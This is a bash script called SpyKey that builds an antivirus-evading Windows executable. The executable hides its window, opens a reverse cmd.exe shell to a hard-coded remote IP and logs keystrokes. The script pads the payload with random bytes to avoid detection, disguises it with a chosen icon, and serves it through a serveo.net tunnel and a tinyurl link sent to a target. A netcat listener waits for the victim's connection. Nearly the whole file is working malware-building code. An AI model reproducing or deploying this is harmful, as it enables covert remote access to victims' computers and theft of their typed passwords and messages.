#!/bin/bash
# SpyKey v1.0
# FUD Reverse Shell (cmd.exe) and Keylogger
# Coded by @thelinuxchoice (You don't become a coder by just changing the credits)
# Github: https://github.com/thelinuxchoice/spykey

trap 'printf "\n";stop' 2

banner() {

printf "\n"  
printf "\e[1;77m .d8888b.                    888                \n"
printf "d88P  Y88b                   888                \n"
printf "Y88b.                        888                \n"                     
printf " \"Y888b.   88888b.  888  888 888  888  .d88b.  888  888               \n"
printf "    \"Y88b. 888 \"88b 888  888 888 .88P d8P  Y8b 888  888              \n"
printf "      \"888 888  888 888  888 888888K  88888888 888  888               \n"
printf "Y88b  d88P 888 d88P Y88b 888 888 \"88b Y8b.     Y88b 888               \n"
printf " \"Y8888P\"  88888P\"   \"Y88888 888  888  \"Y8888   \"Y88888              \n"
printf "           888           888                        888               \n"
printf "           888      Y8b d88P                   Y8b d88P               \n"
printf "           888       \"Y88P\"                     \"Y88P\" v1.0\e[0m  \n"
printf "\n"
printf "      \e[1;92m         Author: @thelinuxchoice\e[0m\n"
printf "      \e[101m:: Warning: Attacking targets without  ::\e[0m\n"
printf "      \e[101m:: prior mutual consent is illegal!    ::\e[0m\n"
printf "\n"
}


stop() {

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

}

dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; 
exit 1; }
command -v i686-w64-mingw32-g++ > /dev/null 2>&1 || { echo >&2 "I require mingw-w64 but it's not installed. Install it: \"apt-get install mingw-w64\" .Aborting."; 
exit 1; }
command -v nc > /dev/null 2>&1 || { echo >&2 "I require Netcat but it's not installed. Install it. Aborting."; 
exit 1; }

}
server() {

printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"


$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net -R '$default_port3':localhost:'$default_port2' 2> /dev/null > sendlink ' &

sleep 7
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

printf "\n"
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s/%s.exe \n' $send_link $payload_name
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link/$payload_name.exe | head -n1)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"
php -S localhost:$port > /dev/null 2>&1 &
sleep 3
printf "\n"
printf '\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting connection...\e[0m\n'
printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Get log from keylogger run:\e[0m\e[1;77m type %s\e[0m\n' $log_name
printf "\n"
nc -lvp $default_port2

}

compile() {

if [[ ! -e program.cpp ]]; then
printf "\e[1;93m[!] Error...\e[0m\n"
exit 1
else
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Compiling... \e[0m\n"
i686-w64-mingw32-windres icon.rc -O coff -o my.res
i686-w64-mingw32-gcc -o $payload_name.exe program.cpp my.res -lws2_32
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s.exe\n" $payload_name
printf "\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] Please, don't upload to virustotal.com !\e[0m\n"
rm -rf program.cpp
rm -rf icon.rc
rm -rf my.res
fi

}

icon() {

default_payload_icon="icon/messenger.ico"
printf "\n"
count=1
count1=1
for icons in $(ls icon/*.ico); do
IFS=$'\n'
printf "\e[1;92m%s:\e[0m\e[1;77m %s\n\e[0m" $count $icons
let count++
done
printf "\e[1;92m99:\e[0m\e[1;77m Choose a path\n\e[0m"
printf "\n"
default_payload_icon=$(ls icon/*ico | sed '1q;d')
printf '\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an ICON (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $count1 
read fileico
if [[ $fileico == 99 ]]; then
read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Icon Path: \e[0m' payload_icon
else
payload_icon=$(ls icon/*ico | sed ''$fileico'q;d')
fileico="${payload_icon:-${default_payload_icon}}"

fi

if [[ ! -e $payload_icon ]]; then
printf '\n\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] File not Found! Try Again! \e[0m\n'
icon
fi
if [[ $payload_icon != *.ico ]]; then
printf '\n\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] Please, use *.ico file format. Try Again! \e[0m\n'
icon
fi


}

start() {

if [[ -e sendlink ]]; then
rm -rf sendlink
fi
default_port=$(seq 1111 4444 | sort -R | head -n1)
default_port2=$(seq 1111 4444 | sort -R | head -n1)
default_port3=$(seq 1111 4444 | sort -R | head -n1)
printf '\n\e[1;92m[\e[0m\e[1;92m+\e[0m\e[1;77m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
read port
port="${port:-${default_port}}"
default_payload_name="payload"
printf '\n\e[1;92m[\e[0m\e[1;92m+\e[0m\e[1;77m] Payload name (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_payload_name
read payload_name
payload_name="${payload_name:-${default_payload_name}}"
default_log_name="log"
printf '\n\e[1;92m[\e[0m\e[1;92m+\e[0m\e[1;77m] Log file name (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_log_name
read log_name
log_name="${log_name:-${default_log_name}}"
icon
payload
compile
server

}

#generatePadding function from powerfull.sh file (by https://github.com/Screetsec/TheFatRat/blob/master/powerfull.sh)
function generatePadding {

    paddingArray=(0 1 2 3 4 5 6 7 8 9 a b c d e f)

    counter=0
    randomNumber=$((RANDOM%${randomness}+23))
    while [  $counter -lt $randomNumber ]; do
        echo "" >> program.cpp
	randomCharnameSize=$((RANDOM%10+7))
        randomCharname=`cat /dev/urandom | tr -dc 'a-zA-Z' | head -c ${randomCharnameSize}`
	echo "unsigned char ${randomCharname}[]=" >> program.cpp
    	randomLines=$((RANDOM%20+13))
	for (( c=1; c<=$randomLines; c++ ))
	do
		randomString="\""
		randomLength=$((RANDOM%11+7))
		for (( d=1; d<=$randomLength; d++ ))
		do
			randomChar1=${paddingArray[$((RANDOM%15))]}
			randomChar2=${paddingArray[$((RANDOM%15))]}
			randomPadding=$randomChar1$randomChar2
	        	randomString="$randomString\\x$randomPadding"
		done
		randomString="$randomString\""
		if [ $c -eq ${randomLines} ]; then
			echo "$randomString;" >> program.cpp
		else
			echo $randomString >> program.cpp
		fi
	done
        let counter=counter+1
    done
}

payload() {

printf '#define _WINSOCK_DEPRECATED_NO_WARNINGS\n' > program.cpp
printf '#include <winsock2.h>\n' >> program.cpp
printf '#include <stdio.h>\n' >> program.cpp
printf "#include <windows.h>\n" >> program.cpp
printf '#pragma comment(lib,"ws2_32")\n' >> program.cpp

generatePadding
generatePadding

printf 'WSADATA wsaData;\n' >> program.cpp
printf 'SOCKET sl;\n' >> program.cpp
printf 'struct sockaddr_in sockcon;\n' >> program.cpp
printf 'STARTUPINFO sui;\n' >> program.cpp
printf 'PROCESS_INFORMATION pi;\n' >> program.cpp
printf 'int main(int argc, char* argv[])\n' >> program.cpp
printf '{\n' >> program.cpp
printf ' ShowWindow (GetConsoleWindow(), SW_HIDE);\n' >> program.cpp
printf ' WSAStartup(MAKEWORD(2,2),&wsaData);\n' >> program.cpp
printf ' sl = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);\n' >> program.cpp
printf ' sockcon.sin_family = AF_INET;\n' >> program.cpp
printf ' sockcon.sin_port = htons(%s);\n' $default_port3  >> program.cpp
printf ' sockcon.sin_addr.s_addr = inet_addr("159.89.214.31");\n' >> program.cpp
printf ' WSAConnect(sl, (SOCKADDR*)&sockcon,sizeof(sockcon),NULL,NULL,NULL,NULL);\n' >> program.cpp

printf ' memset(&sui, 0, sizeof(sui));\n' >> program.cpp
printf ' sui.cb = sizeof(sui);\n' >> program.cpp
printf ' sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);\n' >> program.cpp
printf ' sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) sl;\n' >> program.cpp

printf ' TCHAR commandLine[256] = "cmd.exe";\n' >> program.cpp
printf ' CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL,NULL, &sui, &pi);\n' >> program.cpp
printf 'int keys;\n' >> program.cpp
printf 'FILE *file;\n' >> program.cpp
printf 'while(1) {\n' >> program.cpp
lazy="%"
printf '   for(keys = 32; keys <= 127; keys++) {\n' >> program.cpp
printf '       if(GetAsyncKeyState(keys) == -32767) {\n' >> program.cpp
printf "           file = fopen(\"%s\", \"a\");" $log_name >> program.cpp
printf "           fprintf(file,\"%sc\", keys);" $lazy >> program.cpp
printf "           fclose(file);" >> program.cpp
printf '          }\n' >> program.cpp
printf '       }\n' >> program.cpp
printf '    }\n' >> program.cpp

printf '}\n' >> program.cpp
generatePadding
generatePadding
printf "id ICON \"%s\"" $payload_icon  > icon.rc

}
banner
dependencies
start
